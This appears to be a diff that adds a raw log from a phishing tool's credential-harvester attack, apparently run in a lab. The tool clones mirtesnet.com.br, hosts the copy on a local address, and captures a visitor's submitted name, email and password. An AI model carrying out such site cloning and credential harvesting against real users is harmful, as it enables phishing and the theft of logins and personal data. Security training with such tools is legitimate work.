@@ -1,0 +1,41 @@
+set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.162]:
+[-] SET supports both HTTP and HTTPS
+[-] Example: http://www.thisisafakesite.com
+set:webattack> Enter the url to clone:mirtesnet.com.br
+
+[*] Cloning the website: http://mirtesnet.com.br                                               
+[*] This could take a little bit...                                                            
+
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                      
+[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80                                                 
+[*] Information will be displayed to you as it arrives below:                                  
+192.168.1.112 - - [28/Apr/2023 08:37:05] "GET / HTTP/1.1" 200 -
+192.168.1.112 - - [28/Apr/2023 08:37:07] "GET / HTTP/1.1" 200 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: reg_name=Paulo                                                                          
+PARAM: reg_surname=Tadeu                                                                       
+PARAM: reg_gender=MALE                                                                         
+POSSIBLE USERNAME FIELD FOUND: reg_email=Paulo@gmail.com                                       
+POSSIBLE PASSWORD FIELD FOUND: reg_password=123456                                             
+POSSIBLE PASSWORD FIELD FOUND: reg_password2=123456                                            
+PARAM: reg_birth_day=...                                                                       
+PARAM: reg_birth_mon=...                                                                       
+PARAM: reg_birth_year=...                                                                      
+PARAM: ext_action=register                                                                     
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                  
+                                                                                               
+                                                                                               
+192.168.1.112 - - [28/Apr/2023 08:37:47] "POST /index.html HTTP/1.1" 302 -
+[*] WE GOT A HIT! Printing the output:
+PARAM: reg_name=Paulo                                                                          
+PARAM: reg_surname=Tadeu                                                                       
+PARAM: reg_gender=MALE                                                                         
+POSSIBLE USERNAME FIELD FOUND: reg_email=Paulo@gmail.com                                       
+POSSIBLE PASSWORD FIELD FOUND: reg_password=123456                                             
+POSSIBLE PASSWORD FIELD FOUND: reg_password2=123456                                            
+PARAM: reg_birth_day=1                                                                         
+PARAM: reg_birth_mon=2                                                                         
+PARAM: reg_birth_year=2000                                                                     
+PARAM: ext_action=register                                                                     
+[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
